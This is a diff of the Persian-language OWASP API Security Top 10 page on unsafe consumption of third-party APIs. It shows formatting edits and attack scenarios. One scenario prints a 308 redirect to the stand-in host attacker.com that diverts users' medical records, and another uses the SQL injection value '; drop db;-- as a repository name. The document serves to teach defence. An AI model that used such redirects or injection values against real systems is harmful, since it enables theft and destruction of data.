@@ -1,4 +1,4 @@
-<div dir="rtl" align='right'>
+
 
 # API10:2023 استفاده ناایمن از APIها
 ---
@@ -10,7 +10,7 @@
 
 
 
-### آیا [^1]API از نظر استفاده ناایمن از APIها ‌آسیب‌پذیر است؟
+### آیا API از نظر استفاده ناایمن از APIها ‌آسیب‌پذیر است؟
 ---
 توسعه‌دهندگان معمولاً به داده‌های دریافتی از API‌های طرف ثالث بیشتر از ورودی‌های کاربران اعتماد می‌کنند. این موضوع برای API‌های ارائه شده توسط شرکت‌های معروف بیشتر صدق می‌کند. به همین دلیل، توسعه‌دهندگان عمدتاً استانداردهای امنیتی ضعیف‌تری را در بسیاری از موارد از جمله اعتبارسنجی و تصفیه ورودی اتخاذ می‌کنند.
 
@@ -31,7 +31,7 @@ API‌ها ممکن است در معرض آسیب‌پذیری باشند اگر
 #### سناریو #2
 
 یک API با یک ارائه‌دهنده خدمات طرف ثالث ادغام می‌شود تا اطلاعات حساس پزشکی کاربران را به شکلی ایمن ذخیره کند. داده‌ها با استفاده از یک درخواست HTTP از طریق برقراری یک اتصال امن، ارسال می‌شوند:
-</div>
+
 
 ```http
 POST /user/store_phr_record
@@ -39,22 +39,22 @@ POST /user/store_phr_record
   "genome": "ACTAGTAG__TTGADDAAIICCTT…"
 }
 ```
-<div dir="rtl" align='right'>
+
 
 مهاجمین با نیت مخرب، باعث می‌شوند که این سرویس به جای پاسخ معمولی به درخواست‌ها، پاسخ‌هایی با کد 308 Permanent Redirect ارسال کند. کد 308 به معنای انتقال دائمی است که سبب می‌شود سرویس درخواست‌های کاربران را به مکان دیگری منتقل کند.
-</div>
+
 
 ```http
 HTTP/1.1 308 Permanent Redirect
 Location: https://attacker.com/
 ```
-<div dir="rtl" align='right'>
 
 در نتیجه، اطلاعات حساس کاربران به جای ارسال به سرویس طرف ثالث، به سروری تحت کنترل مهاجم، ارسال می‌شود.
 
+
 #### سناریو #3
 
-مهاجمی یک مخزن Git با نام '; drop db;-- ایجاد می‌کند. وقتی اتصالی از برنامه تحت حمله با مخزن مخرب برقرار شود، برنامه نام مخزن را به عنوان یک ورودی امن در نظر می‌گیرد.
+مهاجمی یک مخزن Git با نام `'; drop db;--` ایجاد می‌کند. وقتی اتصالی از برنامه تحت حمله با مخزن مخرب برقرار شود، برنامه نام مخزن را به عنوان یک ورودی امن در نظر می‌گیرد.
 
 ### چگونه از ‌آسیب‌پذیری استفاده ناایمن از APIها پیشگیری کنیم؟
 ---
@@ -65,7 +65,7 @@ Location: https://attacker.com/
 
 ## مراجع
 ---
-</div>
+
 
 - [OWASP](https://owasp.org/)
 - [Web Service Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html)
@@ -74,11 +74,10 @@ Location: https://attacker.com/
 - [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
 - [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
 - [Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
-<div dir="rtl" align='right'>
+
 
 #### خارجی
 
-</div>
 
 - [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
 - [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
@@ -86,6 +85,5 @@ Location: https://attacker.com/
 
 
 
-[^1]: Unsafe Consumption of APIs
 
 
